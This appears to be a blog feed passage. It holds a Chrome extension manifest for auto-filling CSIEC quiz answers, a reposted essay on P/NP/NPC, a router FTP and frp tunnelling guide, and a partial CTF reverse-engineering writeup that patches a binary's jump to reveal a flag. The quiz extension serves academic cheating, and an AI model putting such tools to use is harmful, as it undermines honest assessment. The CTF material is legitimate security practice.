manifest.json</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"name"</span>: <span class="string">"CSIEC自动填词"</span>,</span><br><span class="line"><span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line"><span class="attr">"manifest_version"</span>: <span class="number">2</span>,</span><br><span class="line"><span class="attr">"description"</span> : <span class="string">"CSIEC自动填词"</span>,</span><br><span class="line"><span class="attr">"browser_action"</span>: &#123;</span><br><span class="line"><span class="attr">"default_icon"</span>  : <span class="string">"favicon.png"</span>,</span><br><span class="line"><span class="attr">"default_title"</span> : <span class="string">"CSIEC自动填词"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"content_scripts"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"matches"</span> : [<span class="string">"http://class.csiec.com/mod/quiz/*"</span>],</span><br><span class="line"><span class="attr">"js"</span>      : [<span class="string">"csiec.js"</span>]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后通过 <a href="chrome://extensions/" target="_blank" rel="noopener">chrome://extensions/</a> 打包为 <code>crx</code> 即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每两周都要做csiec，发现单词答案就在音频的url中 ，尝试了一下用 &lt;code&gt;javascript&lt;/code&gt; 自动填写答案。一开始实现代码在 &lt;code&gt;console&lt;/code&gt; 中运行，最后做成 chrome 插件。&lt;/p&gt;
    
    </summary>
    
      <category term="Coding" scheme="https://www.hydewww.cn/categories/Coding/"/>
    
    
      <category term="javascript， chrome插件" scheme="https://www.hydewww.cn/tags/javascript%EF%BC%8C-chrome%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu18 初始化</title>
    <link href="https://www.hydewww.cn/P_NP_NPC/"/>
    <id>https://www.hydewww.cn/P_NP_NPC/</id>
    <published>2017-10-21T16:00:00.000Z</published>
    <updated>2017-10-21T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于密码学教材中并未阐述清楚三种问题的区别，查阅资料时发现此文，讲的通俗易懂，转载过来mark一下。</p><a id="more"></a><p>原文链接：<a href="http://www.matrix67.com/blog/archives/105" target="_blank" rel="noopener">http://www.matrix67.com/blog/archives/105</a></p><hr><h1 id="什么是P问题、NP问题和NPC问题"><a href="#什么是P问题、NP问题和NPC问题" class="headerlink" title="什么是P问题、NP问题和NPC问题"></a>什么是P问题、NP问题和NPC问题</h1><p> 这或许是众多OIer最大的误区之一。<br>​ 你会经常看到网上出现“这怎么做，这不是NP问题吗”、“这个只有搜了，这已经被证明是NP问题了”之类的话。你要知道，大多数人此时所说的NP问题其实都是指的NPC问题。他们没有搞清楚NP问题和NPC问题的概念。NP问题并不是那种“只有搜才行”的问题，NPC问题才是。好，行了，基本上这个误解已经被澄清了。下面的内容都是在讲什么是P问题，什么是NP问题，什么是NPC问题，你如果不是很感兴趣就可以不看了。接下来你可以看到，把NP问题当成是 NPC问题是一个多大的错误。</p><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p> 还是先用几句话简单说明一下时间复杂度。时间复杂度并不是表示一个程序解决问题需要花多少时间，而是当问题规模扩大后，程序需要的时间长度增长得有多快。也就是说，对于高速处理数据的计算机来说，处理某一个特定数据的效率不能衡量一个程序的好坏，而应该看当这个数据的规模变大到数百倍后，程序运行时间是否还是一样，或者也跟着慢了数百倍，或者变慢了数万倍。不管数据有多大，程序处理花的时间始终是那么多的，我们就说这个程序很好，具有O(1)的时间复杂度，也称常数级复杂度；数据规模变得有多大，花的时间也跟着变得有多长，这个程序的时间复杂度就是O(n)，比如找n个数中的最大值；而像冒泡排序、插入排序等，数据扩大2倍，时间变慢4倍的，属于O(n^2)的复杂度。还有一些穷举类的算法，所需时间长度成几何阶数上涨，这就是O(a^n)的指数级复杂度，甚至O(n!)的阶乘级复杂度。不会存在O(2<em>n^2)的复杂度，因为前面的那个“2”是系数，根本不会影响到整个程序的时间增长。同样地，O (n^3+n^2)的复杂度也就是O(n^3)的复杂度。因此，我们会说，一个O(0.01</em>n^3)的程序的效率比O(100*n^2)的效率低，尽管在n很小的时候，前者优于后者，但后者时间随数据规模增长得慢，最终O(n^3)的复杂度将远远超过O(n^2)。我们也说，O(n^100)的复杂度小于O(1.01^n)的复杂度。<br>​ 容易看出，前面的几类复杂度被分为两种级别，其中后者的复杂度无论如何都远远大于前者：一种是O(1),O(log(n)),O(n^a)等，我们把它叫做多项式级的复杂度，因为它的规模n出现在底数的位置；另一种是O(a^n)和O(n!)型复杂度，它是非多项式级的，其复杂度计算机往往不能承受。当我们在解决一个问题时，我们选择的算法通常都需要是多项式级的复杂度，非多项式级的复杂度需要的时间太多，往往会超时，除非是数据规模非常小。</p><p> 自然地，人们会想到一个问题：会不会所有的问题都可以找到复杂度为多项式级的算法呢？很遗憾，答案是否定的。有些问题甚至根本不可能找到一个正确的算法来，这称之为“不可解问题”(Undecidable Decision Problem)。<a href="http://www.matrix67.com/blog/article.asp?id=62" target="_blank" rel="noopener">The Halting Problem</a>就是一个著名的不可解问题，在我的Blog上有过专门的介绍和证明。再比如，输出从1到n这n个数的全排列。不管你用什么方法，你的复杂度都是阶乘级，因为你总得用阶乘级的时间打印出结果来。有人说，这样的“问题”不是一个“正规”的问题，正规的问题是让程序解决一个问题，输出一个“YES”或“NO”（这被称为判定性问题），或者一个什么什么的最优值（这被称为最优化问题）。那么，根据这个定义，我也能举出一个不大可能会有多项式级算法的问题来：Hamilton回路。问题是这样的：给你一个图，问你能否找到一条经过每个顶点一次且恰好一次（不遗漏也不重复）最后又走回来的路（满足这个条件的路径叫做Hamilton回路）。这个问题现在还没有找到多项式级的算法。事实上，这个问题就是我们后面要说的NPC问题。</p><h2 id="P问题、NP问题"><a href="#P问题、NP问题" class="headerlink" title="P问题、NP问题"></a>P问题、NP问题</h2><p> 下面引入P类问题的概念：如果一个问题可以找到一个能在多项式的时间里解决它的算法，那么这个问题就属于P问题。P是英文单词多项式的第一个字母。哪些问题是P类问题呢？通常NOI和NOIP不会出不属于P类问题的题目。我们常见到的一些信息奥赛的题目都是P问题。道理很简单，一个用穷举换来的非多项式级时间的超时程序不会涵盖任何有价值的算法。<br>​ 接下来引入NP问题的概念。这个就有点难理解了，或者说容易理解错误。在这里强调（回到我竭力想澄清的误区上），NP问题不是非P类问题。NP问题是指可以在多项式的时间里验证一个解的问题。NP问题的另一个定义是，可以在多项式的时间里猜出一个解的问题。比方说，我RP很好，在程序中需要枚举时，我可以一猜一个准。现在某人拿到了一个求最短路径的问题，问从起点到终点是否有一条小于100个单位长度的路线。它根据数据画好了图，但怎么也算不出来，于是来问我：你看怎么选条路走得最少？我说，我RP很好，肯定能随便给你指条很短的路出来。然后我就胡乱画了几条线，说就这条吧。那人按我指的这条把权值加起来一看，嘿，神了，路径长度98，比100小。于是答案出来了，存在比100小的路径。别人会问他这题怎么做出来的，他就可以说，因为我找到了一个比100 小的解。在这个题中，找一个解很困难，但验证一个解很容易。验证一个解只需要O(n)的时间复杂度，也就是说我可以花O(n)的时间把我猜的路径的长度加出来。那么，只要我RP好，猜得准，我一定能在多项式的时间里解决这个问题。我猜到的方案总是最优的，不满足题意的方案也不会来骗我去选它。这就是NP问题。当然有不是NP问题的问题，即你猜到了解但是没用，因为你不能在多项式的时间里去验证它。下面我要举的例子是一个经典的例子，它指出了一个目前还没有办法在多项式的时间里验证一个解的问题。很显然，前面所说的Hamilton回路是NP问题，因为验证一条路是否恰好经过了每一个顶点非常容易。但我要把问题换成这样：试问一个图中是否不存在Hamilton回路。这样问题就没法在多项式的时间里进行验证了，因为除非你试过所有的路，否则你不敢断定它“没有Hamilton回路”。<br>​ 之所以要定义NP问题，是因为通常只有NP问题才可能找到多项式的算法。我们不会指望一个连多项式地验证一个解都不行的问题存在一个解决它的多项式级的算法。相信读者很快明白，信息学中的号称最困难的问题——“NP问题”，实际上是在探讨NP问题与P类问题的关系。</p><p> 很显然，所有的P类问题都是NP问题。也就是说，能多项式地解决一个问题，必然能多项式地验证一个问题的解——既然正解都出来了，验证任意给定的解也只需要比较一下就可以了。关键是，人们想知道，是否所有的NP问题都是P类问题。我们可以再用集合的观点来说明。如果把所有P类问题归为一个集合P中，把所有 NP问题划进另一个集合NP中，那么，显然有P属于NP。现在，所有对NP问题的研究都集中在一个问题上，即究竟是否有P=NP？通常所谓的“NP问题”，其实就一句话：证明或推翻P=NP。<br>​ NP问题一直都是信息学的巅峰。巅峰，意即很引人注目但难以解决。在信息学研究中，这是一个耗费了很多时间和精力也没有解决的终极问<br>题，好比物理学中的大统一和数学中的歌德巴赫猜想等。<br>​ 目前为止这个问题还“啃不动”。但是，一个总的趋势、一个大方向是有的。人们普遍认为，P=NP不成立，也就是说，多数人相信，存在至少一个不可能有多项式级复杂度的算法的NP问题。人们如此坚信P≠NP是有原因的，就是在研究NP问题的过程中找出了一类非常特殊的NP问题叫做NP-完全问题，也即所谓的 NPC问题。C是英文单词“完全”的第一个字母。正是NPC问题的存在，使人们相信P≠NP。下文将花大量篇幅介绍NPC问题，你从中可以体会到NPC问题使P=NP变得多么不可思议。</p><h2 id="约化"><a href="#约化" class="headerlink" title="约化"></a>约化</h2><p> 为了说明NPC问题，我们先引入一个概念——约化(Reducibility，有的资料上叫“归约”)。<br>​ 简单地说，一个问题A可以约化为问题B的含义即是，可以用问题B的解法解决问题A，或者说，问题A可以“变成”问题B。《算法导论》上举了这么一个例子。比如说，现在有两个问题：求解一个一元一次方程和求解一个一元二次方程。那么我们说，前者可以约化为后者，意即知道如何解一个一元二次方程那么一定能解出一元一次方程。我们可以写出两个程序分别对应两个问题，那么我们能找到一个“规则”，按照这个规则把解一元一次方程程序的输入数据变一下，用在解一元二次方程的程序上，两个程序总能得到一样的结果。这个规则即是：两个方程的对应项系数不变，一元二次方程的二次项系数为0。按照这个规则把前一个问题转换成后一个问题，两个问题就等价了。同样地，我们可以说，Hamilton回路可以约化为TSP问题(Travelling Salesman Problem，旅行商问题)：在Hamilton回路问题中，两点相连即这两点距离为0，两点不直接相连则令其距离为1，于是问题转化为在TSP问题中，是否存在一条长为0的路径。Hamilton回路存在当且仅当TSP问题中存在长为0的回路。<br>​ “问题A可约化为问题B”有一个重要的直观意义：B的时间复杂度高于或者等于A的时间复杂度。也就是说，问题A不比问题B难。这很容易理解。既然问题A能用问题B来解决，倘若B的时间复杂度比A的时间复杂度还低了，那A的算法就可以改进为B的算法，两者的时间复杂度还是相同。正如解一元二次方程比解一元一次方程难，因为解决前者的方法可以用来解决后者。<br>​ 很显然，约化具有一项重要的性质：约化具有传递性。如果问题A可约化为问题B，问题B可约化为问题C，则问题A一定可约化为问题C。这个道理非常简单，就不必阐述了。<br>​ 现在再来说一下约化的标准概念就不难理解了：如果能找到这样一个变化法则，对任意一个程序A的输入，都能按这个法则变换成程序B的输入，使两程序的输出相同，那么我们说，问题A可约化为问题B。<br>​ 当然，我们所说的“可约化”是指的可“多项式地”约化(Polynomial-time Reducible)，即变换输入的方法是能在多项式的时间里完成的。约化的过程只有用多项式的时间完成才有意义。</p><h2 id="NPC问题"><a href="#NPC问题" class="headerlink" title="NPC问题"></a>NPC问题</h2><p> 好了，从约化的定义中我们看到，一个问题约化为另一个问题，时间复杂度增加了，问题的应用范围也增大了。通过对某些问题的不断约化，我们能够不断寻找复杂度更高，但应用范围更广的算法来代替复杂度虽然低，但只能用于很小的一类问题的算法。再回想前面讲的P和NP问题，联想起约化的传递性，自然地，我们会想问，如果不断地约化上去，不断找到能“通吃”若干小NP问题的一个稍复杂的大NP问题，那么最后是否有可能找到一个时间复杂度最高，并且能“通吃”所有的 NP问题的这样一个超级NP问题？答案居然是肯定的。也就是说，存在这样一个NP问题，所有的NP问题都可以约化成它。换句话说，只要解决了这个问题，那么所有的NP问题都解决了。这种问题的存在难以置信，并且更加不可思议的是，这种问题不只一个，它有很多个，它是一类问题。这一类问题就是传说中的NPC 问题，也就是NP-完全问题。NPC问题的出现使整个NP问题的研究得到了飞跃式的发展。我们有理由相信，NPC问题是最复杂的问题。再次回到全文开头，我们可以看到，人们想表达一个问题不存在多项式的高效算法时应该说它“属于NPC问题”。此时，我的目的终于达到了，我已经把NP问题和NPC问题区别开了。到此为止，本文已经写了近5000字了，我佩服你还能看到这里来，同时也佩服一下自己能写到这里来。</p><p> NPC问题的定义非常简单。同时满足下面两个条件的问题就是NPC问题。首先，它得是一个NP问题；然后，所有的NP问题都可以约化到它。证明一个问题是 NPC问题也很简单。先证明它至少是一个NP问题，再证明其中一个已知的NPC问题能约化到它（由约化的传递性，则NPC问题定义的第二条也得以满足；至于第一个NPC问题是怎么来的，下文将介绍），这样就可以说它是NPC问题了。<br>​ 既然所有的NP问题都能约化成NPC问题，那么只要任意一个NPC问题找到了一个多项式的算法，那么所有的NP问题都能用这个算法解决了，NP也就等于P 了。因此，给NPC找一个多项式算法太不可思议了。因此，前文才说，“正是NPC问题的存在，使人们相信P≠NP”。我们可以就此直观地理解，NPC问题目前没有多项式的有效算法，只能用指数级甚至阶乘级复杂度的搜索。</p><p> 顺便讲一下NP-Hard问题。NP-Hard问题是这样一种问题，它满足NPC问题定义的第二条但不一定要满足第一条（就是说，NP-Hard问题要比 NPC问题的范围广）。NP-Hard问题同样难以找到多项式的算法，但它不列入我们的研究范围，因为它不一定是NP问题。即使NPC问题发现了多项式级的算法，NP-Hard问题有可能仍然无法得到多项式级的算法。事实上，由于NP-Hard放宽了限定条件，它将有可能比所有的NPC问题的时间复杂度更高从而更难以解决。</p><p> 不要以为NPC问题是一纸空谈。NPC问题是存在的。确实有这么一个非常具体的问题属于NPC问题。下文即将介绍它。<br>​ 下文即将介绍逻辑电路问题。这是第一个NPC问题。其它的NPC问题都是由这个问题约化而来的。因此，逻辑电路问题是NPC类问题的“鼻祖”。<br>​ 逻辑电路问题是指的这样一个问题：给定一个逻辑电路，问是否存在一种输入使输出为True。<br>​ 什么叫做逻辑电路呢？一个逻辑电路由若干个输入，一个输出，若干“逻辑门”和密密麻麻的线组成。看下面一例，不需要解释你马上就明白了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  ┌───┐</span><br><span class="line">  │ 输入1├─→┐   ┌──┐</span><br><span class="line">  └───┘     └─→┤   │</span><br><span class="line">                      │ or ├→─┐</span><br><span class="line">  ┌───┐    ┌─→┤    │    │    ┌──┐</span><br><span class="line">  │ 输入2├─→┤    └──┘    └─→┤    │</span><br><span class="line"> &amp;</span><br><span class="line">nbsp;└───┘    │                ┌─→┤AND ├──→输出</span><br><span class="line">                └────────┘┌→┤    │</span><br><span class="line">  ┌───┐    ┌──┐            │  └──┘</span><br><span class="line">  │ 输入3├─→┤ NOT├─→────┘</span><br><span class="line">  └───┘    └──┘</span><br></pre></td></tr></table></figure><p> 这是个较简单的逻辑电路，当输入1、输入2、输入3分别为True、True、False或False、True、False时，输出为True。<br>​ 有输出无论如何都不可能为True的逻辑电路吗？有。下面就是一个简单的例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌───┐</span><br><span class="line">│输入1 ├→─┐    ┌──┐</span><br><span class="line">└───┘    └─→┤    │</span><br><span class="line">                    │AND ├─→┐</span><br><span class="line">              ┌─→┤    │    │</span><br><span class="line">              │    └──┘    │  ┌──┐</span><br><span class="line">              │                └→┤    │</span><br><span class="line">┌───┐    │                    │AND ├─→输出</span><br><span class="line">│输入2 ├→─┤  ┌──┐      ┌→┤    │</span><br><span class="line">└───┘    └→┤NOT ├→──┘  └──┘</span><br><span class="line">                  └──┘</span><br></pre></td></tr></table></figure><p> 上面这个逻辑电路中，无论输入是什么，输出都是False。我们就说，这个逻辑电路不存在使输出为True的一组输入。<br>​ 回到上文，给定一个逻辑电路，问是否存在一种输入使输出为True，这即逻辑电路问题。<br>​ 逻辑电路问题属于NPC问题。这是有严格证明的。它显然属于NP问题，并且可以直接证明所有的NP问题都可以约化到它（不要以为NP问题有无穷多个将给证明造成不可逾越的困难）。证明过程相当复杂，其大概意思是说任意一个NP问题的输入和输出都可以转换成逻辑电路的输入和输出（想想计算机内部也不过是一些 0和1的运算），因此对于一个NP问题来说，问题转化为了求出满足结果为True的一个输入（即一个可行解）。</p><p> 有了第一个NPC问题后，一大堆NPC问题就出现了，因为再证明一个新的NPC问题只需要将一个已知的NPC问题约化到它就行了。后来，Hamilton 回路成了NPC问题，TSP问题也成了NPC问题。现在被证明是NPC问题的有很多，任何一个找到了多项式算法的话所有的NP问题都可以完美解决了。因此说，正是因为NPC问题的存在，P=NP变得难以置信。P=NP问题还有许多有趣的东西，有待大家自己进一步的挖掘。攀登这个信息学的巅峰是我们这一代的终极目标。现在我们需要做的，至少是不要把概念弄混淆了。</p><p>Matrix67原创<br>转载请注明出处</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于密码学教材中并未阐述清楚三种问题的区别，查阅资料时发现此文，讲的通俗易懂，转载过来mark一下。&lt;/p&gt;
    
    </summary>
    
      <category term="Reproduce" scheme="https://www.hydewww.cn/categories/Reproduce/"/>
    
    
      <category term="N问题" scheme="https://www.hydewww.cn/tags/N%E9%97%AE%E9%A2%98/"/>
    
      <category term="NP问题" scheme="https://www.hydewww.cn/tags/NP%E9%97%AE%E9%A2%98/"/>
    
      <category term="NPC问题" scheme="https://www.hydewww.cn/tags/NPC%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>借助padavan搭建ftp</title>
    <link href="https://www.hydewww.cn/padavan-ftp/"/>
    <id>https://www.hydewww.cn/padavan-ftp/</id>
    <published>2017-10-05T16:00:00.000Z</published>
    <updated>2017-10-05T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>padavan附带很多功能，故想在闲置的路由器上搭建ftp服务器，且校园网几乎覆盖全校，希望尽量使用内网ip进行访问，通过微信推送提示ip变更，再使用frp供校外使用需求。</p><a id="more"></a><p>路由器固件: <a href="http://www.right.com.cn/forum/thread-161324-1-1.html" target="_blank" rel="noopener">老毛子padavan</a></p><h1 id="开启ftp"><a href="#开启ftp" class="headerlink" title="开启ftp"></a>开启ftp</h1><p><em>AiDisk</em> 开启ftp，设置账户及权限。</p><p><em>USB应用程序</em> 设置端口（内网穿透时需要）。</p><p><em>防火墙</em> 开启外网访问。</p><p>然后就能通过 <em>ftp://内网ip</em> 使用ftp服务了。</p><h1 id="消息推送"><a href="#消息推送" class="headerlink" title="消息推送"></a>消息推送</h1><p>使用<a href="http://sc.ftqq.com/" target="_blank" rel="noopener">Server酱</a>，先绑定SCKEY</p><p>由于固件自带的通知提醒脚本中的ip变动提醒为外网ip变动的提醒，故自行更动后覆盖原脚本，这样每次内网ip变动后会自动将新ip(v4&amp;v6)推送至微信。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 读取校园网地址</span><br><span class="line">getV4()&#123;</span><br><span class="line">local v4=$(ifconfig apcli0|grep &quot;inet addr&quot;|cut -d : -f2|awk &apos;&#123;print $1&#125;&apos;)</span><br><span class="line">echo &quot;ftp://&quot;$&#123;v4&#125;</span><br><span class="line">&#125;</span><br><span class="line">    getV6() &#123;</span><br><span class="line">local v6=$(ifconfig apcli0|grep &quot;Scope:Global&quot;|cut -d / -f1|awk &apos;&#123;print $3&#125;&apos;)</span><br><span class="line">echo &quot;ftp://[&quot;$&#123;v6&#125;&quot;]&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    # 写入文件的字符串格式</span><br><span class="line">getWriteIP()&#123;</span><br><span class="line">local v4=$(getV4)</span><br><span class="line">local v6=$(getV6)</span><br><span class="line">echo $&#123;v4&#125;&quot;-&quot;$&#123;v6&#125;</span><br><span class="line">&#125;</span><br><span class="line"># 推送的字符串格式</span><br><span class="line">getSendIP()&#123;</span><br><span class="line">local v4=$(getV4)</span><br><span class="line">local v6=$(getV6)</span><br><span class="line">echo -e $&#123;v4&#125;$&apos;\n\n&apos;$&#123;v6&#125;$&apos;\n&apos;</span><br><span class="line">&#125;</span><br><span class="line"># 读取最近校园网地址</span><br><span class="line">    getLastIP() &#123;</span><br><span class="line">        local lastIP=&quot;/etc/storage/lastIP&quot;</span><br><span class="line">        cat $lastIP</span><br><span class="line">    &#125;</span><br><span class="line">if [ &quot;$serverchan_notify_1&quot; = &quot;1&quot; ] ; then</span><br><span class="line">    local hostIP=$(getWriteIP)</span><br><span class="line">    local lastIP=$(getLastIP)</span><br><span class="line">    if [ &quot;$lastIP&quot; != &quot;$hostIP&quot; ] &amp;&amp; [ ! -z &quot;$hostIP&quot; ] ; then</span><br><span class="line">    sleep 60</span><br><span class="line">local hostIP=$(getWriteIP)</span><br><span class="line">local lastIP=$(getLastIP)</span><br><span class="line">    fi</span><br><span class="line">    if [ &quot;$lastIP1&quot; != &quot;$hostIP1&quot; ] &amp;&amp; [ ! -z &quot;$hostIP1&quot; ] ; then</span><br><span class="line">        logger -t &quot;【校园网 IP 变动】&quot; &quot;目前 IP: $&#123;hostIP&#125;&quot;</span><br><span class="line">        logger -t &quot;【校园网 IP 变动】&quot; &quot;上次 IP: $&#123;lastIP&#125;&quot;</span><br><span class="line">local sendIP=$(getSendIP)</span><br><span class="line">        curl -s &quot;http://sc.ftqq.com/$serverchan_sckey.send?text=校园网IP变动&quot; -d &quot;&amp;desp=$&#123;sendIP&#125;&quot; &amp;</span><br><span class="line">        logger -t &quot;【微信推送】&quot; &quot;校园网IP变动:$&#123;hostIP&#125;&quot;</span><br><span class="line">        echo -n $hostIP1 &gt; /etc/storage/lastIP</span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p><strong>前提：有vps</strong></p><p>为满足校外使用需求，使用 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a> 实现内网穿透。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr = #服务器ip</span><br><span class="line">bind_port = #自定</span><br><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = #同服务器ip</span><br><span class="line">server_port = #同服务器端口</span><br><span class="line"></span><br><span class="line">[ftp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 21</span><br><span class="line">remote_port = 2121 # 自定</span><br><span class="line"></span><br><span class="line"># 下列端口为上面设置的ftp被动端口</span><br><span class="line">[ftp1]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 50000</span><br><span class="line">remote_port = 50000</span><br><span class="line">[ftp2]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 50001</span><br><span class="line">remote_port = 50001</span><br><span class="line">......（下略）</span><br></pre></td></tr></table></figure><p>配置完后即可通过 <em>ftp://服务器ip:2121</em> 访问。</p><p>p.s: frp不仅可以设置ftp的穿透，还能用web服务、ssh等，详情可看<a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">官方文档</a>。</p><h1 id="附：关于ipv6"><a href="#附：关于ipv6" class="headerlink" title="附：关于ipv6"></a>附：关于ipv6</h1><p>由于校园网ipv4限量、ipv6不计费，故希望尽量使用v6网。</p><h2 id="ipv4流量转ipv6"><a href="#ipv4流量转ipv6" class="headerlink" title="ipv4流量转ipv6"></a>ipv4流量转ipv6</h2><p><strong>前提：vps具有ipv6地址</strong></p><p>开启ss，服务器地址填写服务器的v6地址，并采用全局代理。</p><p>即客户端和服务器之间走v6，让服务器进行v4访问，并将内容通过v6返回。</p><h2 id="双开frp-v4-amp-v6"><a href="#双开frp-v4-amp-v6" class="headerlink" title="双开frp(v4&amp;v6)"></a>双开frp(v4&amp;v6)</h2><p>更改脚本，使frpc分别读取不同配置运行两次。注意服务器ip为v6时，需用[]括起来。</p><p>e.g: 修改frps的配置为v6配置，并在脚本最后开启frpc的代码后添加frpc -c /tmp/frp/myfrps.ini &amp;。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;padavan附带很多功能，故想在闲置的路由器上搭建ftp服务器，且校园网几乎覆盖全校，希望尽量使用内网ip进行访问，通过微信推送提示ip变更，再使用frp供校外使用需求。&lt;/p&gt;
    
    </summary>
    
      <category term="Life" scheme="https://www.hydewww.cn/categories/Life/"/>
    
    
      <category term="padavan" scheme="https://www.hydewww.cn/tags/padavan/"/>
    
      <category term="ftp" scheme="https://www.hydewww.cn/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>小学期CTF Writeup</title>
    <link href="https://www.hydewww.cn/CTF_ShortSemester/"/>
    <id>https://www.hydewww.cn/CTF_ShortSemester/</id>
    <published>2017-09-23T16:00:00.000Z</published>
    <updated>2017-09-23T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>第二次CTF，在大佬的指导下竟然通关了，虽然不是次正规的比赛，不过体验还不错。题目和官方WP repo <a href="https://github.com/hydewww/CTF-Writeup/tree/master/TSCTF_ShortSemester" target="_blank" rel="noopener">戳这里</a></p><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>丢进ida，直接看到flag</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/try_1.png" alt="try_1"></p><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>丢进ollydbg，找到如图</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/snake_1.png" alt="snake_1"></p><p>将撞墙后的retn改为jmp 003217F0后运行即可得flag</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/snake_2.png" alt="snake_2"></p><h2 id="Re-Again"><a href="#Re-Again" class="headerlink" title="Re Again"></a>Re Again</h2><p>这题用ida生成的伪代码似乎有问题(?)，由第一个do-while循环确定flag是24位的，其中由flag格式已知首尾是flag{…}。然后查了TryLevel发现是<strong>结构化异常处理 SEH</strong>相关的东西，然而还是看不懂，于是只能把伪码作为参考去啃汇编<strong>（图附注释）</strong>。</p><p>main:</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_1.png" alt="re_again_main1"></p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_2.png" alt="re_again_main2"></p><p>第二个函数（第一个函数类似）：</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_3.png" alt="re_again_except"></p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_4.png" alt="re_again_except2"></p><p>大致看懂后丢进ollydbg用flag{123456789012345678}单步执行。由第二个函数的伪代码的函数声明和od跑一遍的逻辑，发现第一个函数似乎没用(?)，不影响eax的值，于是看第二个函数。</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/re_again_5.png" alt="re_again_except3"></p><p>由于输入的flag前五位是正确的，所以会在里面循环五次后才跳出sorry，由此了解逻辑：第一个byte ptr取出的是字符”1”或”2”，第二个byte ptr依次取出flag的每一位字符，运算后与应得的值进行比较，正确则验证下一位，反向进行异或计算即可获得flag。</p><p>做题时没想到可以直接拿到第二个断点处的数组(手动捂脸)，只能一位一位算，即用fla…算出后一位’g’，再用flag…重新运行算出’{‘ 